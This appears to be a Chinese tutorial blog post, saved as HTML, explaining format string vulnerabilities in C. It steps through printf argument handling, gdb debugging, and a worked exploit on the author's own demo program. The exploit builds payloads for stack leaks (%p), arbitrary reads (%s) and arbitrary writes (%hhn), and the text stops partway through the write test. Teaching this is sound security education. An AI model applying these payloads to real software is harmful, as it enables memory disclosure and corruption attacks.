@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 简介学习哈格式化字符串漏洞原理 这一类型的漏洞能够导致任意地址的读&#x2F;写 漏洞成因是 printf &#x2F; sprintf &#x2F; fprintf 等 c 库中 print 家族函数的使用不当， client 可控内容传入了 print 家族函数的第一实参中 如下代码 #include &amp;lt;stdio.h&amp;gt; void main(void){     char str[100] &#x3D; {0}">
+<meta name="keywords" content="learn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="format string vuln">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;format-string-vuln&#x2F;index.html">
+<meta property="og:site_name" content="zndetcl blog">
+<meta property="og:description" content="0x01 简介学习哈格式化字符串漏洞原理 这一类型的漏洞能够导致任意地址的读&#x2F;写 漏洞成因是 printf &#x2F; sprintf &#x2F; fprintf 等 c 库中 print 家族函数的使用不当， client 可控内容传入了 print 家族函数的第一实参中 如下代码 #include &amp;lt;stdio.h&amp;gt; void main(void){     char str[100] &#x3D; {0}">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-01-05T18:12:50.709Z">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>format string vuln</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/12/17/pwndocker/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/12/09/pwn-%E5%85%A5%E9%97%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/12/14/format-string-vuln/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/12/14/format-string-vuln/&text=format string vuln" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/12/14/format-string-vuln/&is_video=false&description=format string vuln" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=format string vuln&body=Check out this article: http://yoursite.com/2019/12/14/format-string-vuln/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/12/14/format-string-vuln/&title=format string vuln" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/12/14/format-string-vuln/&name=format string vuln&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2019/12/14/format-string-vuln/&t=format string vuln" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-格式控制符的使用"><span class="toc-number">3.</span> <span class="toc-text">0x03 格式控制符的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#a-s"><span class="toc-number">3.1.</span> <span class="toc-text">a. %s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b-n"><span class="toc-number">3.2.</span> <span class="toc-text">b. %n</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-利用技巧"><span class="toc-number">3.3.</span> <span class="toc-text">c. 利用技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-尝试利用"><span class="toc-number">4.</span> <span class="toc-text">0x04 尝试利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">5.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        format string vuln
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zndetcl blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-14T10:47:34.000Z" itemprop="datePublished">2019-12-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/binary/">binary</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>学习哈格式化字符串漏洞原理</p>
+<p>这一类型的漏洞能够导致任意地址的读/写</p>
+<p>漏洞成因是 <code>printf</code> / <code>sprintf</code> / <code>fprintf</code> 等 c 库中 print 家族函数的使用不当， client 可控内容传入了 print 家族函数的第一实参中</p>
+<p>如下代码</p>
+<pre><code class="C">#include &lt;stdio.h&gt;
+void main(void){
+    char str[100] = {0};
+    printf(&quot;hello, your name:\n&quot;);
+    scanf(&quot;%s&quot;, str);
+    // printf(&quot;%s&quot;, str);
+    printf(str);
+}</code></pre>
+<p>如上，一般我们习惯注释代码：  <code>printf(&quot;.....%s......&quot;, xxxx)</code> 这样形式进行调用 printf，这样一般是没有问题的，哪怕 printf 是支持可变长参数，但是第一实参如果是固定的话，开发人员都会检查检查的（排除某些特殊场景的应用：第一实参字符串中的格式控制符个数与后续参数个数不匹配）</p>
+<p>要是直接使用的如上 <code>printf(str)</code> 这样形式的调用，代表着 client 能够完全 / 部分可控第一实参</p>
+<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>我们先来学习下类 <code>printf</code> 函数如何使用</p>
+<p>就拿 <code>printf</code> 来说吧，函数原型如下：</p>
+<pre><code class="c"># include &lt;stdio.h&gt;
+int printf(const char *format, ...);</code></pre>
+<p>第一个形参为 char 指针，后续参数个数可变长 0~n 个</p>
+<p>写个小demo，如下</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+// gcc -o test test.c 
+void main(void)
+{
+    printf(&quot;%d %d %d %d %s\n&quot;, 1, 2, 3, 4, &quot;test&quot;);
+    printf(&quot;%4$d %3$d %2$d %1$d %5$s\n&quot;, 1, 2, 3, 4, &quot;test&quot;);
+}</code></pre>
+<p>运行结果如下</p>
+<pre><code class="text">$ ./test 
+1 2 3 4 test
+4 3 2 1 test</code></pre>
+<p>都显得很正常，没有什么不对劲的，但是第二个 printf 语句输出的结果和第一个完全不同，可以注意到输出参数值的位置发生了变化，都是因为在格式化字符串中，存在 <strong><code>%N$</code></strong> 这样的符号，它可以表示读取 / 写入到具体哪一位参数中</p>
+<p>不过从 printf 形参来看的话， <strong><code>%N$</code></strong> 当中的 N 其实是指向了第 N+1 个形参，例如 <code>%4$</code> 就表示使用第 4+1=5 个形参，也就是整数 4，所以第二个 printf 输出的第一位整型是 4</p>
+<p>上述流程我们熟悉了一下 printf 的正常使用方法，能够观察到，在格式化字符串中格式控制符的个数需要和后续可变长参数的实际个数对应起来</p>
+<p>那我们测试一下，要是 格式控制符个数 != 后续实际参数个数 会发生什么情况</p>
+<ol>
+<li>格式控制符个数 &gt; 实际参数个数</li>
+<li>格式控制符个数 &lt; 实际参数个数</li>
+</ol>
+<p>以上两种情况让我们写个 demo 测试下</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+// gcc -o test test.c // 编译过程的 warning 不用理会
+void main(void)
+{
+    printf(&quot;%d %d %d %d %p\n&quot;, 1, 2, 3, 4);
+    printf(&quot;%d %d %d %d %p\n&quot;, 1, 2, 3, 4, 5, 6);
+}</code></pre>
+<p>运行结果如下</p>
+<pre><code class="text">$ ./test 
+1 2 3 4 0x7fd6a6539d80
+1 2 3 4 0x5</code></pre>
+<p>由上述，第一条 printf 语句格式化字符串中含有 5 个格式控制符，而后续实际参数只有 4 个，第二条 printf 语句格式化字符串中含有 5 个格式控制符，而后续实际参数个数为 6</p>
+<p><em>最后一个格式控制符 %p 是用来打印地址用的，或者可以理解为将指定参数值以 16 进制地址表示的方式打印出来。</em></p>
+<p><em>在 32 位系统中，打印 4 字节，测试环境在 64 位系统中所以打印 8 字节，高位 0 不显示</em></p>
+<p>从输出结果上看，当 <strong>格式控制符个数 &gt; 实际参数个数</strong> 时，会产生异常，而小于实际参数个数时没有什么问题</p>
+<p>这到底发生了什么? <code>0x7fd6a6539d80</code> 是怎么出来的?</p>
+<p>关闭 pie ，开启调试信息</p>
+<p><code>$ gcc -g -no-pie -o test test.c</code></p>
+<p>我们调试一下，看看到底发生了什么</p>
+<p><code>$ gdb -q ./test</code> </p>
+<p>反编译 main 函数，如下</p>
+<pre><code class="text">gef➤  disassemble main
+Dump of assembler code for function main:
+   0x00000000004004e7 &lt;+0&gt;:    push   rbp
+   0x00000000004004e8 &lt;+1&gt;:    mov    rbp,rsp
+   0x00000000004004eb &lt;+4&gt;:    mov    r8d,0x4
+   0x00000000004004f1 &lt;+10&gt;:    mov    ecx,0x3
+   0x00000000004004f6 &lt;+15&gt;:    mov    edx,0x2
+   0x00000000004004fb &lt;+20&gt;:    mov    esi,0x1
+   0x0000000000400500 &lt;+25&gt;:    lea    rdi,[rip+0xcd]        # 0x4005d4
+   0x0000000000400507 &lt;+32&gt;:    mov    eax,0x0
+   0x000000000040050c &lt;+37&gt;:    call   0x4003f0 &lt;printf@plt&gt;
+   0x0000000000400511 &lt;+42&gt;:    sub    rsp,0x8
+   0x0000000000400515 &lt;+46&gt;:    push   0x6
+   0x0000000000400517 &lt;+48&gt;:    mov    r9d,0x5
+   0x000000000040051d &lt;+54&gt;:    mov    r8d,0x4
+   0x0000000000400523 &lt;+60&gt;:    mov    ecx,0x3
+   0x0000000000400528 &lt;+65&gt;:    mov    edx,0x2
+   0x000000000040052d &lt;+70&gt;:    mov    esi,0x1
+   0x0000000000400532 &lt;+75&gt;:    lea    rdi,[rip+0x9b]        # 0x4005d4
+   0x0000000000400539 &lt;+82&gt;:    mov    eax,0x0
+   0x000000000040053e &lt;+87&gt;:    call   0x4003f0 &lt;printf@plt&gt;
+   0x0000000000400543 &lt;+92&gt;:    add    rsp,0x10
+   0x0000000000400547 &lt;+96&gt;:    nop
+   0x0000000000400548 &lt;+97&gt;:    leave  
+   0x0000000000400549 &lt;+98&gt;:    ret    
+End of assembler dump.</code></pre>
+<p>由于是第一条 printf 引发的异常，我们分别在 <code>0x000000000040050c</code> 与 <code>0x0000000000400511</code> 打下断点</p>
+<pre><code class="text">gef➤  b *0x0000000000400511
+Breakpoint 1 at 0x400511: file test.c, line 6.
+gef➤  b *0x000000000040050c
+Breakpoint 2 at 0x40050c: file test.c, line 5.
+gef➤  i b
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep y   0x0000000000400511 in main at test.c:6
+2       breakpoint     keep y   0x000000000040050c in main at test.c:5</code></pre>
+<p>run，断点时，部分信息如下</p>
+<pre><code class="text">// 实参传递如下
+──────────────────────────────────────────────────────────────── arguments (guessed) ────
+printf@plt (
+   $rdi = 0x00000000004005d4 → &quot;%d %d %d %d %d&quot;,
+   $rsi = 0x0000000000000001,
+   $rdx = 0x0000000000000002,
+   $rcx = 0x0000000000000003,
+   $r8  = 0x4,
+   $r9  = 0x00007ffff7dd0d80  →  0x0000000000000000,
+   [...]
+)
+// 栈中布局 $rsp 为起点
+gef➤  x/10x $rsp
+0x7fffffffdd50:    0x0000000000400550    0x00007ffff7a05b97
+0x7fffffffdd60:    0x0000000000000001    0x00007fffffffde38
+0x7fffffffdd70:    0x0000000100008000    0x00000000004004e7
+0x7fffffffdd80:    0x0000000000000000    0x561ce4c720595e27
+0x7fffffffdd90:    0x0000000000400400    0x00007fffffffde30</code></pre>
+<p>解释一下传参，首先测试环境处于 64 位系统中，传参过程默认使用  <code>rdi</code> /  <code>rsi</code> / <code>rdx</code> / <code>rcx</code> / <code>r8</code> / <code>r9</code> 这 6 个寄存器传递函数的前 6 个参数，而后面的省略号是因为 printf 是支持可变长参数的传递，按照约定，函数调用者会将第 7 位及之后的参数压入栈中，按照 $rbp 的偏移量来引用（或者值传递的话，做一份值拷贝在当前函数栈中）</p>
+<p><em>32 位系统中是完全按照 $ebp 来引用的，也就说所有的参数都在栈中</em></p>
+<p>继续执行到下一个断点处，部分打印信息如下</p>
+<pre><code class="text">gef➤  c
+Continuing.
+1 2 3 4 0x7ffff7dd0d80</code></pre>
+<p>由上可见，第一条 printf 语句已经执行完毕，并打印出了结果</p>
+<p>我们仔细观察一下打印出的 <code>0x7ffff7dd0d80</code> ，其实就是在上一个断点（执行 printf 函数调用之前）的 <code>r9</code> 寄存器的值，只是寄存器存储的是 <code>0x00007ffff7dd0d80</code> 完整的 64 位地址， printf 输出的时候忽略了高位的 0000</p>
+<p>那么思考一下，照此推理，岂不是可以打印出 <code>r9</code> 甚至栈中的值？</p>
+<p>测试一下，在格式化字符串中填充更多的 <code>$p</code> </p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+void main(void)
+{
+    printf(&quot;%d %d %d %d %p %p %p %p\n&quot;, 1, 2, 3, 4);
+    printf(&quot;%d %d %d %d %p\n&quot;, 1, 2, 3, 4, 5, 6);
+}</code></pre>
+<p>调试，断点照常打在第一条 printf 语句处</p>
+<p>部分信息如下</p>
+<pre><code class="text">// 实参传递如下
+printf@plt (
+   $rdi = 0x00000000004005d4 → &quot;%d %d %d %d %p %p %p %p&quot;,
+   $rsi = 0x0000000000000001,
+   $rdx = 0x0000000000000002,
+   $rcx = 0x0000000000000003, 
+   $r8  = 0x4,
+   $r9  = 0x00007ffff7dd0d80  →  0x0000000000000000
+)
+// 栈中布局 $rsp 为起点
+gef➤  x/20x $rsp
+0x7fffffffdd90:    0x00400550    0x00000000    0xf7a05b97    0x00007fff
+0x7fffffffdda0:    0x00000001    0x00000000    0xffffde78    0x00007fff
+0x7fffffffddb0:    0x00008000    0x00000001    0x004004e7    0x00000000
+0x7fffffffddc0:    0x00000000    0x00000000    0xbd9b0cd6    0x5d9bc473
+0x7fffffffddd0:    0x00400400    0x00000000    0xffffde70    0x00007fff
+// 继续执行
+gef➤  c
+Continuing.
+1 2 3 4 0x7ffff7dd0d80 0x400550 0x7ffff7a05b97 0x1
+1 2 3 4 0x5</code></pre>
+<p>栈中输出方式不太相同，这不重要能看就行</p>
+<p>首先，1，2，3，4 正常打印出</p>
+<p>第 5 位，输出了 <code>r9</code> 的值</p>
+<p>第 6 位，输出了 printf 调用前，<code>rsp</code> 的值 (0x0000000000400550)</p>
+<p>第 7 位，输出了 printf 调用前，<code>rsp + 0x8</code> 的值 (0x00007ffff7a05b97)</p>
+<p>第 8 位，输出了 printf 调用前，<code>rsp + 0x10</code> 的值 (0x0000000000000001)</p>
+<p><strong>至此，漏洞原理已经讲述清楚，由于在格式化字符串中，格式控制符的个数 &gt; 后续参数个数，会导致越界读取操作，从而泄露内存信息，因为格式控制符具有指定哪个参数参与计算的作用，且严格按照函数调用约定，依次从寄存器（64位系统某些函数调用约定）&amp; 栈中（64 &amp; 32位系统某些函数调用约定）取值</strong></p>
+<p><strong>其根本就是因为 printf 这类支持可变长参数的函数，无法确定具体参数个数，并且在其函数处理过程中，涉及到具体参数读取/写入等操作，容易引发越界读取 / 写入内存</strong></p>
+<h2 id="0x03-格式控制符的使用"><a href="#0x03-格式控制符的使用" class="headerlink" title="0x03 格式控制符的使用"></a>0x03 格式控制符的使用</h2><p>常用的格式控制符主要有以下几个：</p>
+<pre><code>%d - 十进制 - 输出十进制整数
+%s - 字符串 - 从内存中读取字符串, 遇见 \x00 就截断
+%x - 十六进制 - 输出十六进制数
+%c - 字符 - 输出字符
+%p - 指针 - 以16进制地址的形式输出，32位系统输出 4 字节，64 位系统输出 8 字节
+%n - 到目前为止所写的字符数</code></pre><p>由上，其实输出形式无所谓的，关键是各个控制符能够读取 / 写入多少字节</p>
+<p><code>%p</code> 就能很好的读出栈中的值，因为它就是 4 字节 / 8 字节的读取</p>
+<p>其中 <strong><code>%s</code></strong> /  <strong><code>%n</code></strong> 需要特别注意，其他个控制符只能读取寄存器 &amp; 栈中所存的值，能泄露多少信息完全依靠 printf 调用前 <code>rsp</code> 的位置决定</p>
+<h3 id="a-s"><a href="#a-s" class="headerlink" title="a. %s"></a>a. %s</h3><p>我们回想一下 <code>%s</code> 的使用</p>
+<pre><code class="c">[...]
+char * name; // or char name[N];
+[...]
+printf(&quot;%s&quot;, name);</code></pre>
+<p>如上，这是正常的 <code>%s</code> 使用方法，后面第二个实参是一个地址（数组名也指向了地址）</p>
+<p>思考一下，只要是我们能够指定任意地址，那岂不是就能通过 <code>%s</code> 去获取任意地址的值，以字符串的形式输出?</p>
+<p>不过存在一个缺点就是，碰见 \x00 就会截止输出</p>
+<p>此时如果想要完全 dump 地址内存，就需要计算 \x00 的地址 = 上一次的输出起始地址 + 输出字符数</p>
+<h3 id="b-n"><a href="#b-n" class="headerlink" title="b. %n"></a>b. %n</h3><p><code>%n</code> 可以用来把一个 int 型的值（4 字节）写入指定的地址中，写入值为它出现之前打印的所有字符数</p>
+<p>例如，<code>123456%2c%n</code> 这一个格式化字符串，<code>%n</code> 写入的值为 6 + 2 = 8，以最终输出结果确定打印长度-&gt;写入值 </p>
+<p>demo</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+void main(void){
+  int n;
+  printf(&quot;blah %n blah\n&quot;, &amp;n);
+  printf(&quot;n = %d\n&quot;, n);
+}</code></pre>
+<p>运行，输出如下</p>
+<pre><code class="text">blah  blah
+n = 5</code></pre>
+<p>如上所述，可以观察到 <code>%n</code> 可以写入到一个指定地址中 4 字节的值，而该值 = <code>%n</code> 之前的打印长度</p>
+<p>思考一下，只要我们能够指定一个任意地址，通过特殊构造，就能够写入任意值，岂不是达到了任意地址写入任意值的目的?</p>
+<p><strong>综上， printf 类函数都是根据寄存器 &amp; 栈来进行参数取值，那么意味着我们只要能够控制部分寄存器 or 栈，就能够通过一定的构造，造成任意地址的读 / 写</strong></p>
+<h3 id="c-利用技巧"><a href="#c-利用技巧" class="headerlink" title="c. 利用技巧"></a>c. 利用技巧</h3><pre><code class="text">这部分来自icemakr的博客
+
+//32位
+//读
+&#39;%{}$x&#39;.format(index)           // 读4个字节
+&#39;%{}$p&#39;.format(index)           // 同上面
+&#39;${}$s&#39;.format(index)
+//写 
+&#39;%{}$n&#39;.format(index)           // 解引用，写入四个字节
+&#39;%{}$hn&#39;.format(index)          // 解引用，写入两个字节
+&#39;%{}$hhn&#39;.format(index)         // 解引用，写入一个字节
+&#39;%{}$lln&#39;.format(index)         // 解引用，写入八个字节
+////////////////////////////
+//64位
+//读
+&#39;%{}$x&#39;.format(index, num)      // 读4个字节
+&#39;%{}$lx&#39;.format(index, num)     // 读8个字节
+&#39;%{}$p&#39;.format(index)           // 读8个字节
+&#39;${}$s&#39;.format(index)
+//写
+&#39;%{}$n&#39;.format(index)           // 解引用，写入四个字节
+&#39;%{}$hn&#39;.format(index)          // 解引用，写入两个字节
+&#39;%{}$hhn&#39;.format(index)         // 解引用，写入一个字节
+&#39;%{}$lln&#39;.format(index)         // 解引用，写入八个字节
+////////////////////////////
+%1$lx: RSI
+%2$lx: RDX
+%3$lx: RCX
+%4$lx: R8
+%5$lx: R9
+%6$lx: 栈上的第一个QWORD</code></pre>
+<h2 id="0x04-尝试利用"><a href="#0x04-尝试利用" class="headerlink" title="0x04 尝试利用"></a>0x04 尝试利用</h2><p>写一个小demo</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+// gcc -g -no-pie -o printf printf.c
+void main(void){
+    //char * hello;
+    char hello[100] = {0};
+    printf(&quot;what&#39;s your name?\n&quot;);
+    scanf(&quot;%s&quot;, hello);
+    printf(hello);
+}</code></pre>
+<p>尝试打印出寄存器 &amp; 栈中的值（测试环境 x86_64）</p>
+<pre><code class="text">$ ./printf 
+what&#39;s your name?
+aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p
+aaaaaaaa.0x1.0x7f1e070958d0.0x7f1e07094560.(nil).(nil).0x6161616161616161.0x252e70252e70252e.0x2e70252e70252e70</code></pre>
+<p>如上，输入 8 个 a 是因为需要刚好填满一个栈（64 位系统 8 字节），后面用 <code>.</code> 分开显示值，梳理一下</p>
+<pre><code class="text">aaaaaaaa            // 格式化字符串的起始
+0x1                 // rsi, printf 第 2 个形参
+0x7f1e070958d0      // rdx, printf 第 3 个形参
+0x7f1e07094560      // rcx, printf 第 4 个形参
+(nil)               // r8 , printf 第 5 个形参
+(nil)               // r9 , printf 第 6 个形参
+0x6161616161616161  // rbp + 16, printf 第 7 个形参
+0x252e70252e70252e  // rbp + 24, printf 第 8 个形参
+0x2e70252e70252e70  // rbp + 32, printf 第 9 个形参
+[...]</code></pre>
+<p>由上可以发现，可以从 rbp + 16 (printf 函数的 rbp) 开始打印整个栈，到第 7 个形参的时候，就打印出了 hello 变量起始地址的 8 个字节 ( aaaaaaaa )</p>
+<p>简单一点，尝试读出 aaaaaaaa 这 8 个字符吧，在输出串变动的时候，也需要修改 poc 才行</p>
+<pre><code class="text">%7$p++++aaaaaaaa910</code></pre>
+<p>解释一下如上格式化字符串，<code>%7$p</code> 表示打印 printf 第 7 + 1 = 8 个形参并且以16进制地址形式输出（64 位系统，地址为 8 字节，所以 <code>%p</code> 会读取 8 字节的数据），从上一个打印寄存器 &amp; 栈中值的测试能够看出，格式化字符串的起始地址在 <code>%6$</code> ，现在我们起始地址内容是 <code>%7$p++++</code> （按照 8 字节计算），那么想要打印出 aaaaaaaa 就需要读取 <code>%6$</code> 这个地址，其中 <code>++++</code> 是为了凑字节的</p>
+<p>那理应输出结果是 : <code>aaaaaaaa++++aaaaaaaa910</code></p>
+<p>运行程序，输出如下</p>
+<pre><code class="text">$ ./printf 
+what&#39;s your name?
+%7$p++++aaaaaaaa910
+0x6161616161616161++++aaaaaaaa910</code></pre>
+<p>正如我们预料的一样，只是字符串以 16 进制地址形式展示</p>
+<p>现在<strong>尝试使用 <code>%s</code> 来进行任意地址读取</strong>，<strong>如何才能指定任意地址呢</strong>？</p>
+<p>欸我们有一个 hello 变量使用的栈开辟的存储空间，那么就可以利用栈来指定任意地址</p>
+<p>为了简单明了，关闭 pie 保护，开始 gdb 调试，断点打在 printf 调用处，查看 <code>rsp</code></p>
+<pre><code class="text">gef➤  x/10x $rsp
+0x7fffffffdce0:    0x31313131    0x31313131    0x00000000    0x00000000
+0x7fffffffdcf0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x7fffffffdd00:    0x00000000    0x00000000
+// 也可以查看 hello 变量地址
+gef➤  print &amp;hello
+$2 = (char (*)[100]) 0x7fffffffdce0</code></pre>
+<p>上文中说过，<code>%6$</code> 表示 rbp + 16 的地址（<strong>也是当前 rsp 指向的地址，恰好也是 hello 变量地址</strong>），那么我们通过修改栈中值，而后再用 <code>%s</code> 去读取栈中值所指向的地址</p>
+<p>假如我们想要读取 0x7fffffffdcf8 地址的存储值，那么可以将 0x7fffffffdcf8 地址塞入 0x7fffffffdce0 中，然后使用 <code>%6$s</code> 去读取</p>
+<p>构造如下</p>
+<pre><code class="text">b&#39;\xf8\xdc\xff\xff\xff\x7f\x00\x00&#39;AAAAAAAA%6$s====BBBBBBBB123456789</code></pre>
+<p>注意，程序中录入输入字符串时的截断字符 &amp; 小端值输入 &amp; 输出结果在终端打印时会有 00 截断</p>
+<p>修改一下，注意 <code>%6$</code> 也应该对应改变</p>
+<pre><code class="text">CCCCCCCCAAAAAAAA%11$s===BBBBBBBB12345678\xf8\xdc\xff\xff\xff\x7f\x00\x00</code></pre>
+<p>在 gdb 中测试结果如下</p>
+<pre><code class="text">// 先写入 test2
+$ python -c &#39;print &quot;CCCCCCCCAAAAAAAA%11$s===BBBBBBBB12345678\xf8\xdc\xff\xff\xff\x7f\x00\x00&quot;&#39; &gt; test2
+// 进入 gdb
+gef➤  r &lt; test2
+Starting program: /home/zndetcl/Desktop/learn_pwn/string_format/printf &lt; test2
+what&#39;s your name?
+CCCCCCCCAAAAAAAABBBBBBBB12345678�����===BBBBBBBB12345678�����[Inferior 1 (process 3758) exited normally]</code></pre>
+<p>如上，输出结果当中 === 前后数据一至</p>
+<p>可以通过断点观察到 printf 调用前栈中的布局</p>
+<pre><code class="text">──────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdce0│+0x0000: 0x4343434343434343     ← $rsp, $rdi
+0x00007fffffffdce8│+0x0008: 0x4141414141414141
+0x00007fffffffdcf0│+0x0010: 0x3d3d3d7324313125
+0x00007fffffffdcf8│+0x0018: 0x4242424242424242
+0x00007fffffffdd00│+0x0020: 0x3837363534333231
+0x00007fffffffdd08│+0x0028: 0x00007fffffffdcf8  →  0x4242424242424242
+0x00007fffffffdd10│+0x0030: 0x0000000000000000
+0x00007fffffffdd18│+0x0038: 0x0000000000000000</code></pre>
+<p>可以观察到 0x00007fffffffdcf8 地址就是 BBB* 字符串的起始地址，<code>%s</code> 会从起始地址开始一直读取到 \x00</p>
+<p><strong>尝试利用 <code>%n</code> 来进行任意地址写入</strong></p>
+<p>简单起见，还是对 0x00007fffffffdcf8 进行写入，就把低位 B 改为 1 吧 (0x42-&gt;0x31)</p>
+<p><code>aa%44c...%11$hhn</code> ：就能表示向栈中某地址写入两个字节，其值为 2 + 44 + 3 = 49 = 0x31（<strong>注意栈 8 字节对齐</strong>）</p>
+<p>那么构造如下，先写入地址，然后读取地址值，查看是否被改写</p>
+<pre><code class="text">aa%44c...%11$hhn%11$s===BBBBBBBB12345678\xf8\xdc\xff\xff\xff\x7f\x00\x00</code></pre>
+<p>在 gdb 中观察如下</p>
+<pre><code class="text">// 先写入 test3
+$ python -c &#39;print &quot;aa%44c...%11$hhn%11$s===BBBBBBBB12345678\xf8\xdc\xff\xff\xff\x7f\x00\x00&quot;&#39; &gt; test3
+// 进入 gdb
+gef➤  r &lt; test3
+Starting program: /home/zndetcl/Desktop/learn_pwn/string_format/printf &lt; test3
